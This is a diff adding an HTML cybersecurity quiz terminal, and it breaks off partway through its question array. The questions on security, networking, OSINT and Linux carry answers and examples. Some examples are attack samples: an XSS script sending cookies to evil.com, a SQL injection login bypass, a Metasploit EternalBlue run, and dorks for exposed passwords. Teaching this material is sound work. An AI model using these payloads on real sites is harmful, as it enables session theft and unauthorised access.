@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberSec Practice Terminal</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body {
+  height: 100%;
+  background: #0d0d0d;
+  font-family: "Courier New", Courier, monospace;
+  color: #00ff41;
+  overflow: hidden;
+}
+#terminal {
+  height: 100vh;
+  overflow-y: auto;
+  padding: 20px;
+  padding-bottom: 80px;
+}
+#terminal::-webkit-scrollbar { width: 8px; }
+#terminal::-webkit-scrollbar-track { background: #0d0d0d; }
+#terminal::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+.line { white-space: pre-wrap; word-wrap: break-word; line-height: 1.6; }
+.cyan { color: #00bfff; }
+.green { color: #00ff41; }
+.red { color: #ff4444; }
+.dim { color: #555; }
+.yellow { color: #ffcc00; }
+.code { color: #b0b0b0; font-style: italic; }
+.separator { color: #555; }
+#input-line {
+  display: flex;
+  align-items: center;
+  margin-top: 4px;
+}
+#input-line .prompt { color: #00bfff; margin-right: 8px; white-space: nowrap; }
+#user-input {
+  background: transparent;
+  border: none;
+  outline: none;
+  color: #00ff41;
+  font-family: "Courier New", Courier, monospace;
+  font-size: inherit;
+  flex: 1;
+  caret-color: #00ff41;
+}
+.cursor-blink::after {
+  content: "_";
+  animation: blink 0.7s step-end infinite;
+}
+@keyframes blink {
+  50% { opacity: 0; }
+}
+</style>
+</head>
+<body>
+<div id="terminal">
+  <div id="output"></div>
+  <div id="input-line" style="display:none;">
+    <span class="prompt">$&gt;</span>
+    <input type="text" id="user-input" autocomplete="off" spellcheck="false">
+  </div>
+</div>
+<script>
+const questions = [
+  // ═══ DIFFICULTY 1 — EASY (34) ═══
+  {type:"flashcard",topic:"cyber",diff:1,q:"What is a vulnerability?",a:"a weakness in a system that can be exploited",hint:"Think of it as an unlocked door in your system.",explain:"A vulnerability is any flaw — misconfiguration, unpatched software, weak password — that an attacker could use to break in. Think: an open window in your house.",example:"Example: Running an outdated version of Apache with a known bug is a vulnerability."},
+  {type:"flashcard",topic:"cyber",diff:1,q:"What is an exploit?",a:"taking advantage of a vulnerability",alts:["using a vulnerability to attack a system","abusing a weakness in a system","leveraging a flaw to gain access"],hint:"The act of using the weakness, not the weakness itself.",explain:"An exploit is the actual method or code used to take advantage of a vulnerability. The vulnerability is the hole; the exploit is walking through it.",example:"# Metasploit example\nmsf> use exploit/windows/smb/ms17_010\nmsf> set RHOSTS 10.0.0.5\nmsf> exploit"},
+  {type:"flashcard",topic:"cyber",diff:1,q:"What does 'CIA' stand for in cybersecurity?",a:"confidentiality integrity availability",alts:["confidentiality, integrity, availability","confidentiality, integrity, and availability"],hint:"The three pillars of information security.",explain:"Confidentiality = only authorized people see data. Integrity = data hasn't been tampered with. Availability = systems are up when needed. Every security decision maps to one of these."},
+  {type:"flashcard",topic:"cyber",diff:1,q:"What is malware?",a:"malicious software designed to harm or exploit a system",alts:["malicious software","software designed to cause harm"],hint:"Mal = bad, ware = software.",explain:"Malware is an umbrella term for any software intentionally designed to cause damage. It includes viruses, worms, trojans, ransomware, spyware, and more."},
+  {type:"flashcard",topic:"cyber",diff:1,q:"What is phishing?",a:"a social engineering attack that tricks users into revealing sensitive information",alts:["tricking users into giving up sensitive info","fake emails or messages to steal credentials"],hint:"Usually arrives as a fake email or message.",explain:"Phishing uses fake messages that look legitimate to trick you into clicking a malicious link or entering credentials on a fake login page. Always check the sender address and URL before clicking.",example:'Example phishing email subject:\n"URGENT: Your account will be suspended! Click here to verify."'},
+  {type:"fillin",topic:"cyber",diff:1,q:"A ___ is a string proving you completed a CTF challenge.",a:"flag",hint:"Format on TryHackMe: THM{...}",explain:"In Capture The Flag (CTF) competitions, a flag is a hidden string you find by solving a challenge. It proves you completed it. Platforms like TryHackMe and HackTheBox use formats like THM{s0m3_t3xt} or HTB{...}.",example:"Example flag: THM{y0u_f0und_1t}"},
+  {type:"fillin",topic:"cyber",diff:1,q:"The three pillars of information security are Confidentiality, Integrity, and ___.",a:"availability",hint:"Can you access it when you need it?",explain:"Availability ensures systems and data are accessible when needed. A DDoS attack, for example, targets availability by flooding a server so legitimate users can't reach it."},
+  {type:"flashcard",topic:"cyber",diff:1,q:"What is a virus in computing?",a:"malware that attaches to a program and spreads when the program runs",alts:["self-replicating malware that attaches to files","malicious code that spreads by attaching to programs"],hint:"It needs a host program to spread.",explain:"A virus can't run on its own — it attaches to a legitimate program and executes when that program runs. Unlike worms, viruses require user action (like opening a file) to spread."},
+  {type:"flashcard",topic:"cyber",diff:1,q:"What is encryption?",a:"the process of converting data into a coded format to prevent unauthorized access",alts:["scrambling data so only authorized users can read it","encoding data to keep it secret"],hint:"Think of it as putting data in a locked box.",explain:"Encryption transforms readable plaintext into unreadable ciphertext using an algorithm and a key. Only someone with the correct key can decrypt it back. HTTPS, for example, encrypts web traffic.",example:"# Encrypt a file with openssl\nopenssl enc -aes-256-cbc -in secret.txt -out secret.enc"},
+  {type:"fillin",topic:"cyber",diff:1,q:"A ___ is a type of malware that locks your files and demands payment.",a:"ransomware",alts:["ransom"],hint:"The attacker holds your data hostage.",explain:"Ransomware encrypts your files and displays a ransom note demanding payment (usually cryptocurrency) for the decryption key. Notable examples include WannaCry and LockBit. Prevention: keep backups offline."},
+  {type:"flashcard",topic:"networking",diff:1,q:"What does IP stand for?",a:"internet protocol",hint:"The set of rules for addressing and routing data.",explain:"Internet Protocol defines how data is addressed and routed across networks. Every device gets an IP address so routers know where to send packets. IPv4 uses 32-bit addresses (like 192.168.1.1), IPv6 uses 128-bit."},
+  {type:"flashcard",topic:"networking",diff:1,q:"What is a private IP address?",a:"identifies a device within a local network",hint:"Used inside your home or office network.",explain:"Private IPs (like 192.168.x.x or 10.x.x.x) are used inside local networks and aren't routable on the public internet. Your router uses NAT to translate them to your public IP when you go online.",example:"Common private IP ranges:\n10.0.0.0 - 10.255.255.255\n172.16.0.0 - 172.31.255.255\n192.168.0.0 - 192.168.255.255"},
+  {type:"flashcard",topic:"networking",diff:1,q:"What does LAN stand for?",a:"local area network",hint:"The network inside your building.",explain:"A LAN is a network within a small area — your home, office, or school. Devices on a LAN communicate directly via Ethernet cables or Wi-Fi through a switch or router."},
+  {type:"flashcard",topic:"networking",diff:1,q:"What does WAN stand for?",a:"wide area network",hint:"Connects LANs across large distances — like the internet.",explain:"A WAN connects LANs over large geographic areas. The internet itself is the largest WAN. Your ISP connects your home LAN to the broader WAN."},
+  {type:"fillin",topic:"networking",diff:1,q:"An IP address is divided into ___ octets.",a:"4",hint:"Example: 86.157.52.21 — count the sections.",explain:"An IPv4 address has 4 octets separated by dots. Each octet is 8 bits (0-255), making the full address 32 bits. This gives roughly 4.3 billion possible addresses.",example:"Example: 192.168.1.100\n         ^1  ^2  ^3 ^4 (four octets)"},
+  {type:"fillin",topic:"networking",diff:1,q:"Ping uses ___ packets to test connection performance.",a:"icmp",alts:["internet control message protocol"],hint:"The protocol name is 4 letters.",explain:"ICMP (Internet Control Message Protocol) is used for network diagnostics. Ping sends an ICMP Echo Request and waits for an Echo Reply, measuring the round-trip time to check if a host is reachable.",example:"$ ping 8.8.8.8\nPING 8.8.8.8: 64 bytes, icmp_seq=0 time=12.4 ms"},
+  {type:"flashcard",topic:"networking",diff:1,q:"What is a router?",a:"a device that forwards data between different networks",alts:["connects networks together and routes traffic","device that directs traffic between networks"],hint:"It decides which path data should take.",explain:"A router connects different networks (e.g., your LAN to the internet) and uses routing tables to decide the best path for each packet. It operates at Layer 3 (Network) of the OSI model."},
+  {type:"flashcard",topic:"networking",diff:1,q:"What is a switch?",a:"a device that connects devices within the same network and forwards data using mac addresses",alts:["connects devices on a local network","forwards data to specific devices on a LAN"],hint:"It works at the data link layer using MAC addresses.",explain:"A switch operates at Layer 2 (Data Link) and uses a MAC address table to forward frames only to the correct port. Unlike a hub, it doesn't broadcast to all devices — making it faster and more secure."},
+  {type:"flashcard",topic:"networking",diff:1,q:"What does HTTP stand for?",a:"hypertext transfer protocol",hint:"The protocol your browser uses to load web pages.",explain:"HTTP is the foundation of web communication. Your browser sends HTTP requests (GET, POST, etc.) to a web server, which responds with HTML, images, and other content. HTTPS adds TLS encryption on top."},
+  {type:"fillin",topic:"networking",diff:1,q:"The default port for HTTP is ___.",a:"80",hint:"HTTPS uses 443.",explain:"Well-known ports: HTTP = 80, HTTPS = 443, SSH = 22, FTP = 21, DNS = 53. Knowing common ports helps you identify services during a scan and recognize suspicious traffic.",example:"$ nmap -p 80,443 example.com\n80/tcp  open  http\n443/tcp open  https"},
+  {type:"flashcard",topic:"osint",diff:1,q:"What does OSINT stand for?",a:"open source intelligence",hint:"Intelligence gathered from publicly available sources.",explain:"OSINT is intelligence collected from publicly available sources — websites, social media, public records, DNS records, etc. It's the first step in most penetration tests and investigations because it requires no direct interaction with the target."},
+  {type:"flashcard",topic:"osint",diff:1,q:"What is Shodan?",a:"a search engine for internet-connected devices",hint:"It continuously scans public IPs for open services.",explain:"Shodan scans the internet and indexes information about connected devices — servers, webcams, routers, IoT devices. Unlike Google which indexes web pages, Shodan indexes banners and open ports.",example:'Shodan search example:\napache country:"US" port:8080'},
+  {type:"fillin",topic:"osint",diff:1,q:"The CVE identifier format is: CVE-___-NUMBER",a:"year",alts:["YEAR"],hint:"Example: CVE-2025-55182",explain:"CVE identifiers follow the format CVE-YEAR-NUMBER. The year is when the vulnerability was reported (not necessarily discovered). The number is sequentially assigned. This creates a universal reference everyone can use.",example:"Example: CVE-2021-44228 (Log4Shell)"},
+  {type:"flashcard",topic:"osint",diff:1,q:"What is Google Dorking?",a:"using advanced google search operators to find specific information or exposed data",alts:["using special google queries to find hidden info","advanced google searches to discover sensitive data"],hint:"Operators like site:, filetype:, inurl: narrow results.",explain:"Google Dorking uses advanced search operators to find information that shouldn't be public — exposed admin panels, password files, database dumps. It's a powerful and legal recon technique.",example:'site:example.com filetype:pdf\nintitle:"index of" passwords\ninurl:admin login'},
+  {type:"flashcard",topic:"osint",diff:1,q:"What is a WHOIS lookup?",a:"a query that returns registration information about a domain name or ip address",alts:["looks up who owns a domain","finds registration info for a domain"],hint:"It shows who registered a domain and when.",explain:"WHOIS queries a database of domain registration records, showing the registrant, registrar, creation date, and name servers. Many domains now use privacy protection to hide personal details.",example:"$ whois example.com\nRegistrant: REDACTED FOR PRIVACY\nCreated: 1995-08-14"},
+  {type:"flashcard",topic:"osint",diff:1,q:"What does CVE stand for?",a:"common vulnerabilities and exposures",hint:"A standardized list of known security flaws.",explain:"The CVE system, maintained by MITRE, provides a standardized identifier for every known vulnerability. This lets security tools, researchers, and vendors all refer to the same issue unambiguously."},
+  {type:"flashcard",topic:"linux",diff:1,q:"What does the command 'ls' do?",a:"lists files and folders in the current directory",alts:["lists files in the current directory","list files and directories"],hint:"Short for 'listing'.",explain:"ls is one of the most-used Linux commands. By default it shows non-hidden files. Add flags to customize: -l for details, -a for hidden files, -h for human-readable sizes.",example:"$ ls -la\ndrwxr-xr-x  2 user user 4096 Jan  1 12:00 .\n-rw-r--r--  1 user user  512 Jan  1 12:00 notes.txt"},
+  {type:"flashcard",topic:"linux",diff:1,q:"What does the command 'pwd' do?",a:"prints the current working directory",alts:["shows your current directory","print working directory"],hint:"Print Working Directory.",explain:"pwd (Print Working Directory) outputs the full absolute path of where you currently are in the filesystem. Useful when navigating deep directory structures.",example:"$ pwd\n/home/student/Documents/project"},
+  {type:"flashcard",topic:"linux",diff:1,q:"What does the command 'cd' do?",a:"changes the current directory",alts:["change directory","navigate to a different directory"],hint:"cd = change directory.",explain:"cd changes your current location in the filesystem. Use cd .. to go up one level, cd ~ to go home, or cd /path/to/dir for an absolute path.",example:"$ cd /var/log\n$ pwd\n/var/log\n$ cd ..\n$ pwd\n/var"},
+  {type:"command",topic:"linux",diff:1,q:"List all files and folders in the current directory.",a:"ls",hint:"Short for 'listing'.",explain:"ls lists directory contents. It's the first command most people learn. Without flags it shows just file/folder names. With -l you get permissions, owner, size, and date.",example:"$ ls\nDesktop  Documents  Downloads  Pictures"},
+  {type:"command",topic:"linux",diff:1,q:"Print the full path of your current location in the filesystem.",a:"pwd",hint:"Print Working Directory.",explain:"pwd shows exactly where you are. This is especially helpful in scripts or when you've cd'd through many directories and lost track of your location."},
+  {type:"command",topic:"linux",diff:1,q:"Show the name of the currently logged-in user.",a:"whoami",hint:"Literally asks 'who am I?'",explain:"whoami prints the effective username. During a pentest, this is one of the first commands you run after gaining a shell — it tells you what privilege level you have.",example:"$ whoami\nstudent\n# After privilege escalation:\n$ whoami\nroot"},
+  {type:"fillin",topic:"linux",diff:1,q:"The `wc -l` command counts the number of ___ in a file.",a:"lines",hint:"wc = word count, -l = lines flag.",explain:"wc (word count) is versatile: -l counts lines, -w counts words, -c counts bytes. It's often piped with other commands to count results.",example:"$ cat users.txt | wc -l\n247"},
+  {type:"flashcard",topic:"linux",diff:1,q:"What does the 'cat' command do?",a:"displays the contents of a file",alts:["prints file contents to the terminal","outputs the content of a file","reads a file and prints it"],hint:"Short for concatenate.",explain:"cat reads files and prints them to stdout. It can also concatenate multiple files together. For large files, use less or head instead to avoid flooding your terminal.",example:"$ cat /etc/hostname\nmy-server"},
+
+  // ═══ DIFFICULTY 2 — MEDIUM (33) ═══
+  {type:"flashcard",topic:"cyber",diff:2,q:"What is offensive security?",a:"the practice of thinking and acting like an attacker to find vulnerabilities before malicious hackers do",hint:"It's about finding weaknesses before the bad guys do.",explain:"Offensive security (red teaming) proactively simulates real attacks against an organization's systems. The goal is to find and fix vulnerabilities before actual attackers discover them. It complements defensive (blue team) security."},
+  {type:"flashcard",topic:"cyber",diff:2,q:"What is ethical hacking / penetration testing?",a:"legal authorized hacking to test defenses",alts:["authorized hacking to test defenses","legal hacking to test defenses"],hint:"Same skills as malicious hacking — but with permission.",explain:"A penetration tester uses the same tools and techniques as malicious hackers but with written legal authorization (a scope document). The output is a report with findings and remediation advice."},
+  {type:"flashcard",topic:"cyber",diff:2,q:"What is a flag in a CTF challenge?",a:"a string proving you completed a challenge",alts:["thm{...}","a string in the format thm{...}"],hint:"Format is usually THM{...} on TryHackMe.",explain:"CTF (Capture The Flag) challenges hide flags in vulnerable machines, encrypted files, or web applications. Finding one proves you solved the puzzle. Competitions can be Jeopardy-style (categories) or Attack-Defense (live targets).",example:"Flag formats by platform:\nTryHackMe: THM{...}\nHackTheBox: HTB{...}\npicoCTF: picoCTF{...}"},
+  {type:"flashcard",topic:"cyber",diff:2,q:"What does dirb do?",a:"tries thousands of common folder names against a website to find hidden pages",alts:["finds hidden pages on a website","brute forces directory names on a website"],hint:"Think of it as a digital locksmith trying every key.",explain:"Dirb (and similar tools like gobuster, feroxbuster) perform directory brute-forcing — trying common paths like /admin, /login, /backup against a target URL. This reveals pages not linked in the site navigation.",example:"$ dirb http://target.com /usr/share/wordlists/dirb/common.txt\n+ http://target.com/admin (CODE:200)\n+ http://target.com/backup (CODE:403)"},
+  {type:"flashcard",topic:"cyber",diff:2,q:"What is a firewall?",a:"a system that monitors and controls incoming and outgoing network traffic based on security rules",alts:["controls network traffic based on rules","filters network traffic"],hint:"It acts as a barrier between trusted and untrusted networks.",explain:"Firewalls inspect packets and allow or block them based on rules (source/destination IP, port, protocol). They can be hardware appliances, software, or cloud-based. iptables and ufw are common Linux firewalls.",example:"# Allow SSH, block everything else (ufw)\n$ sudo ufw allow 22\n$ sudo ufw default deny incoming\n$ sudo ufw enable"},
+  {type:"flashcard",topic:"cyber",diff:2,q:"What is a trojan horse in cybersecurity?",a:"malware disguised as legitimate software",alts:["malicious program hidden inside a normal-looking application","malware that looks like a safe program"],hint:"Named after the Greek myth — looks safe, but isn't.",explain:"A trojan tricks the user into installing it by pretending to be something useful — a game, a utility, a cracked app. Once running, it can open backdoors, steal data, or install more malware. Unlike viruses, trojans don't self-replicate."},
+  {type:"flashcard",topic:"cyber",diff:2,q:"What is two-factor authentication (2FA)?",a:"a security method that requires two different forms of verification to access an account",alts:["using two methods to verify identity","requiring two proofs of identity to log in"],hint:"Something you know + something you have.",explain:"2FA combines two of three factor types: something you know (password), something you have (phone/token), something you are (fingerprint). Even if your password is stolen, the attacker needs the second factor."},
+  {type:"fillin",topic:"cyber",diff:2,q:"A ___ attack floods a target with traffic to make it unavailable.",a:"denial of service",alts:["dos","ddos","denial-of-service"],hint:"DoS or DDoS (if distributed).",explain:"A DoS attack overwhelms a target with traffic so legitimate users can't access it. A DDoS (Distributed DoS) uses many compromised machines (a botnet) to amplify the attack, making it much harder to block."},
+  {type:"flashcard",topic:"networking",diff:2,q:"What are the two things used to identify a device on a network?",a:"ip address and mac address",alts:["mac address and ip address"],hint:"One acts like a name, the other like a fingerprint.",explain:"IP addresses are logical (assigned by the network, can change) and used for routing between networks. MAC addresses are physical (burned into the hardware) and used for communication within a local network segment."},
+  {type:"flashcard",topic:"networking",diff:2,q:"What is a public IP address?",a:"identifies a device on the internet, assigned by your isp",alts:["an ip that identifies a device on the internet"],hint:"ISP = Internet Service Provider.",explain:"Your public IP is what the rest of the internet sees. It's assigned by your ISP and shared by all devices on your home network via NAT. You can find yours by searching 'what is my IP' in a browser."},
+  {type:"flashcard",topic:"networking",diff:2,q:"What is a MAC address?",a:"a 12-character hexadecimal number tied to the physical network interface on a device",alts:["a unique hardware identifier for a network interface","12-character hex number on a device's motherboard"],hint:"Example: a4:c3:f0:85:ac:2d",explain:"MAC (Media Access Control) addresses are 48-bit hardware identifiers written as 12 hex characters. The first 6 identify the manufacturer (OUI). They operate at Layer 2 and are used by switches to forward frames.",example:"$ ip link show eth0\nlink/ether a4:c3:f0:85:ac:2d"},
+  {type:"flashcard",topic:"networking",diff:2,q:"What protocol does ping use?",a:"icmp",alts:["internet control message protocol"],hint:"ICMP = Internet Control Message Protocol.",explain:"Ping sends ICMP Echo Requests and listens for Echo Replies. It measures round-trip time (latency) and packet loss. Note: some firewalls block ICMP, so a host not responding to ping doesn't necessarily mean it's down.",example:"$ ping -c 3 google.com\n64 bytes from 142.250.80.46: time=11.2 ms\n3 packets transmitted, 3 received, 0% loss"},
+  {type:"fillin",topic:"networking",diff:2,q:"MAC addresses can be ___, allowing a device to impersonate another.",a:"spoofed",hint:"The verb for faking your hardware identity.",explain:"MAC spoofing changes your network interface's MAC address in software. Attackers use it to bypass MAC-based access controls or impersonate trusted devices. It's also used legitimately for privacy.",example:"# Spoof a MAC address on Linux\n$ sudo ip link set eth0 down\n$ sudo ip link set eth0 address aa:bb:cc:dd:ee:ff\n$ sudo ip link set eth0 up"},
+  {type:"fillin",topic:"networking",diff:2,q:"IPv6 provides over ___ trillion address variations.",a:"340",hint:"A very large number compared to IPv4's ~4 billion.",explain:"IPv6 uses 128-bit addresses, providing 340 undecillion (3.4 x 10^38) addresses. This solves IPv4 exhaustion. IPv6 addresses look like 2001:0db8:85a3::8a2e:0370:7334.",example:"IPv4: 192.168.1.1 (32-bit, ~4.3 billion)\nIPv6: 2001:db8::1 (128-bit, ~340 trillion trillion trillion)"},
+  {type:"flashcard",topic:"networking",diff:2,q:"What is DNS?",a:"domain name system, translates domain names into ip addresses",alts:["domain name system","translates domain names to ip addresses"],hint:"It's like a phone book for the internet.",explain:"When you type google.com, DNS resolves it to an IP like 142.250.80.46. Your device queries a DNS resolver, which checks root servers, TLD servers, and authoritative servers in a hierarchy.",example:"$ nslookup google.com\nAddress: 142.250.80.46\n\n$ dig google.com +short\n142.250.80.46"},
+  {type:"flashcard",topic:"networking",diff:2,q:"What is the difference between TCP and UDP?",a:"tcp is connection-oriented and reliable while udp is connectionless and faster",alts:["tcp guarantees delivery, udp does not","tcp is reliable, udp is faster but unreliable"],hint:"TCP = reliable handshake. UDP = fire and forget.",explain:"TCP uses a 3-way handshake (SYN, SYN-ACK, ACK) and guarantees delivery with retransmissions. UDP skips the handshake — faster but no delivery guarantee. HTTP/SSH use TCP. DNS/video streaming use UDP."},
+  {type:"fillin",topic:"networking",diff:2,q:"The default port for HTTPS is ___.",a:"443",hint:"HTTP is 80, HTTPS is encrypted.",explain:"HTTPS = HTTP + TLS encryption on port 443. When you see the padlock icon in your browser, you're using HTTPS. It prevents eavesdropping and tampering with data in transit.",example:"Common ports to memorize:\n21 FTP | 22 SSH | 53 DNS | 80 HTTP | 443 HTTPS"},
+  {type:"flashcard",topic:"osint",diff:2,q:"What is VirusTotal?",a:"a tool that aggregates results from 70+ antivirus engines and website scanners",alts:["aggregates 70+ antivirus engines into one interface"],hint:"Used in blue teaming to check files and links.",explain:"VirusTotal lets you upload a file or paste a URL to scan it against 70+ antivirus engines simultaneously. It also shows community comments, behavioral analysis, and historical data. Essential for incident response."},
+  {type:"flashcard",topic:"osint",diff:2,q:"What is the CVE Programme?",a:"a universal dictionary of known vulnerabilities with unique identifiers",alts:["common vulnerabilities and exposures database"],hint:"Each entry gets a unique CVE-YEAR-NUMBER identifier.",explain:"Maintained by MITRE, the CVE database assigns a unique ID to every known vulnerability. Security tools like Nessus and Qualys reference CVEs in scan results. NVD (National Vulnerability Database) adds scoring and details."},
+  {type:"fillin",topic:"osint",diff:2,q:"Each CVE is assigned a ___ score based on impact, complexity, and exploitability.",a:"cvss",alts:["CVSS"],hint:"Common Vulnerability Scoring System.",explain:"CVSS (Common Vulnerability Scoring System) rates vulnerabilities 0-10 based on factors like attack vector, complexity, and impact. A score of 9.0+ is Critical. It helps teams prioritize which vulnerabilities to patch first.",example:"CVSS 9.8 (Critical) — Log4Shell (CVE-2021-44228)\nCVSS 7.5 (High) — typical remote info disclosure\nCVSS 3.1 (Low) — local, requires user interaction"},
+  {type:"scenario",topic:"osint",diff:2,q:"You found a suspicious .exe file in an email attachment. What tool do you use to check it against 70+ antivirus engines at once?",a:"virustotal",alts:["virus total","www.virustotal.com"],hint:"It aggregates many AV scanners into one interface.",explain:"VirusTotal is the go-to for quick file analysis. Upload the file or submit its hash (SHA-256) to check without uploading. Be aware: uploaded files become accessible to VirusTotal's paying customers.",example:"# Check a file hash without uploading\n$ sha256sum suspicious.exe\n$ # Paste the hash at virustotal.com"},
+  {type:"scenario",topic:"osint",diff:2,q:"A researcher discovers a new software vulnerability and reports it. What format will its official identifier follow?",a:"cve-year-number",alts:["CVE-YEAR-NUMBER","cve year number"],hint:"Example: CVE-2025-55182",explain:"The researcher reports to a CNA (CVE Numbering Authority) like MITRE. They assign a CVE ID in the format CVE-YEAR-NUMBER. The YEAR is when it was assigned, not when the bug was introduced. The vulnerability then gets published in the NVD."},
+  {type:"flashcard",topic:"osint",diff:2,q:"What is the Wayback Machine?",a:"an internet archive that stores snapshots of websites over time",alts:["archive.org tool that saves old versions of websites","a tool that lets you view old versions of web pages"],hint:"Run by the Internet Archive at archive.org.",explain:"The Wayback Machine (web.archive.org) crawls and archives billions of web pages. In OSINT, it's used to find old versions of a target's website — pages that were removed, old employee directories, or leaked documents."},
+  {type:"command",topic:"linux",diff:2,q:"Print the text 'Hello World' to the terminal.",a:"echo Hello World",alts:["echo 'Hello World'","echo \"Hello World\""],hint:"The echo command outputs text.",explain:"echo outputs text to stdout. Single quotes preserve literal text, double quotes allow variable expansion. It's also used to write to files via redirection.",example:"$ echo Hello World\nHello World\n$ NAME='student'\n$ echo \"Hello $NAME\"\nHello student"},
+  {type:"command",topic:"linux",diff:2,q:"Navigate into a folder called Documents.",a:"cd Documents",hint:"cd = change directory.",explain:"cd changes your working directory. Use relative paths (cd Documents) or absolute paths (cd /home/user/Documents). cd - takes you to your previous directory, and cd alone goes home.",example:"$ cd Documents\n$ pwd\n/home/student/Documents"},
+  {type:"command",topic:"linux",diff:2,q:"Count the number of lines in a file called access.log.",a:"wc -l access.log",hint:"wc with the -l flag counts lines.",explain:"wc -l counts newline characters in a file, effectively giving you the line count. This is commonly piped with grep to count matches.",example:"$ wc -l access.log\n14523 access.log"},
+  {type:"fillin",topic:"linux",diff:2,q:"The `-R` flag in grep makes the search ___.",a:"recursive",hint:"It searches all subfolders too.",explain:"-R (or -r) tells grep to descend into subdirectories and search every file within. Without it, grep only searches the files you explicitly name.",example:"$ grep -R 'password' /etc/\n/etc/shadow:root:$6$...\n/etc/pam.d/login:password required"},
+  {type:"fillin",topic:"linux",diff:2,q:"The `>` operator ___ a file, while `>>` ___ to it. (Answer: first word only)",a:"overwrites",alts:["overwrite"],hint:"> destroys existing content. >> adds to the end.",explain:"> (redirect) creates or overwrites the file with new content. >> (append) adds to the end without touching existing content. This distinction is critical — using > when you meant >> destroys your data.",example:"$ echo 'first' > log.txt   # log.txt = 'first'\n$ echo 'second' > log.txt  # log.txt = 'second' (first is GONE)\n$ echo 'third' >> log.txt  # log.txt = 'second\\nthird'"},
+  {type:"command",topic:"linux",diff:2,q:"Create a file called welcome containing the word hey. (Use redirect, not touch.)",a:"echo hey > welcome",alts:["echo 'hey' > welcome","echo \"hey\" > welcome"],hint:"The > operator redirects output into a file.",explain:"echo outputs text, and > redirects that output into a file instead of the terminal. If the file doesn't exist, it's created. If it does, it's overwritten.",example:"$ echo hey > welcome\n$ cat welcome\nhey"},
+  {type:"command",topic:"linux",diff:2,q:"Append the word hello to the existing file welcome without overwriting it.",a:"echo hello >> welcome",alts:["echo 'hello' >> welcome","echo \"hello\" >> welcome"],hint:">> appends. > overwrites.",explain:">> appends to the end of the file, preserving everything already in it. This is how you add log entries, build lists, or accumulate output without losing previous data.",example:"$ cat welcome\nhey\n$ echo hello >> welcome\n$ cat welcome\nhey\nhello"},
+  {type:"scenario",topic:"linux",diff:2,q:"You used > instead of >> when saving command output to a file. What happened to the file's previous contents?",a:"they were overwritten",alts:["overwritten","deleted","lost","erased"],hint:"> does not append — it replaces the entire file.",explain:"> truncates the file to zero length before writing. The old contents are gone permanently (unless you have a backup). This is one of the most common mistakes in Linux — always double-check your redirects."},
+  {type:"scenario",topic:"networking",diff:2,q:"You're troubleshooting a slow connection to a server. What built-in tool (available on Windows and Linux) can you use to test the connection performance?",a:"ping",hint:"It measures round-trip time using ICMP packets.",explain:"Ping sends ICMP packets and measures round-trip time. High latency or packet loss indicates network issues. It's the first tool to reach for when something feels slow or unreachable.",example:"$ ping -c 4 192.168.1.1\nround-trip min/avg/max = 1.2/2.4/5.1 ms\n0% packet loss"},
+  {type:"command",topic:"linux",diff:2,q:"Display the first 10 lines of a file called log.txt.",a:"head log.txt",alts:["head -n 10 log.txt","head -10 log.txt"],hint:"head shows the beginning of a file.",explain:"head shows the first N lines of a file (default 10). Its counterpart is tail, which shows the last N lines. Both are essential for quickly inspecting large log files without opening them fully.",example:"$ head log.txt\n$ head -n 5 log.txt    # first 5 lines\n$ tail -n 20 log.txt   # last 20 lines"},
+
+  // ═══ DIFFICULTY 3 — HARD (33) ═══
+  {type:"scenario",topic:"cyber",diff:3,q:"You want to find hidden admin panels on a target website that aren't linked from the main menu. Which tool do you use?",a:"dirb",hint:"It brute-forces directory names against the site.",explain:"Dirb, gobuster, and feroxbuster all perform directory enumeration. They try thousands of common paths from a wordlist against the target URL and report any that return HTTP 200/301/403.",example:"$ dirb http://10.10.10.5 /usr/share/wordlists/common.txt\n+ http://10.10.10.5/admin (CODE:200)\n+ http://10.10.10.5/phpmyadmin (CODE:301)"},
+  {type:"flashcard",topic:"cyber",diff:3,q:"What is the difference between a vulnerability scan and a penetration test?",a:"a vulnerability scan identifies weaknesses automatically while a penetration test actively exploits them to prove impact",alts:["scanning finds vulnerabilities, pentesting exploits them","vuln scan is automated, pentest is manual exploitation"],hint:"One finds the unlocked doors, the other walks through them.",explain:"A vuln scan (Nessus, Qualys) automatically checks for known vulnerabilities and produces a report. A pentest goes further — a human actually exploits the findings to demonstrate real-world impact, then writes recommendations."},
+  {type:"flashcard",topic:"cyber",diff:3,q:"What is a zero-day vulnerability?",a:"a vulnerability that is unknown to the vendor and has no patch available",alts:["an unpatched unknown vulnerability","a vulnerability with no fix yet"],hint:"Zero days since the vendor learned about it.",explain:"Zero-days are the most dangerous vulnerabilities because there's no patch and often no detection signature. They're called 'zero-day' because the vendor has had zero days to fix it. They're highly valued on both black and white markets."},
+  {type:"scenario",topic:"cyber",diff:3,q:"An attacker sends a carefully crafted email to a specific executive at a company to steal credentials. What type of attack is this?",a:"spear phishing",alts:["spear-phishing"],hint:"Regular phishing is broad; this targets one person.",explain:"Spear phishing targets a specific individual using personalized information (their name, role, projects). It's far more effective than mass phishing because the email looks legitimate and relevant to the target."},
+  {type:"flashcard",topic:"cyber",diff:3,q:"What is SQL injection?",a:"an attack that inserts malicious sql code into input fields to manipulate a database",alts:["injecting sql commands through user input to access or modify a database","inserting sql queries into forms to hack a database"],hint:"The attacker sends SQL commands where the app expects normal text.",explain:"SQLi occurs when user input is inserted directly into a SQL query without sanitization. The attacker can bypass authentication, dump entire databases, or even execute system commands.",example:"Vulnerable login form:\nUsername: admin' OR '1'='1' --\nPassword: anything\n\nResulting SQL:\nSELECT * FROM users WHERE user='admin' OR '1'='1' --'"},
+  {type:"flashcard",topic:"cyber",diff:3,q:"What is cross-site scripting (XSS)?",a:"an attack that injects malicious scripts into web pages viewed by other users",alts:["injecting javascript into a website that runs in other users browsers","inserting malicious code into a webpage to attack visitors"],hint:"The attacker's script runs in the victim's browser.",explain:"XSS lets attackers inject JavaScript that runs in other users' browsers. It can steal cookies/session tokens, redirect users, or deface pages. The fix: always sanitize and escape user input before rendering it in HTML.",example:'Injected comment on a forum:\n\x3Cscript\x3Edocument.location="http://evil.com/steal?c="+document.cookie\x3C/script\x3E'},
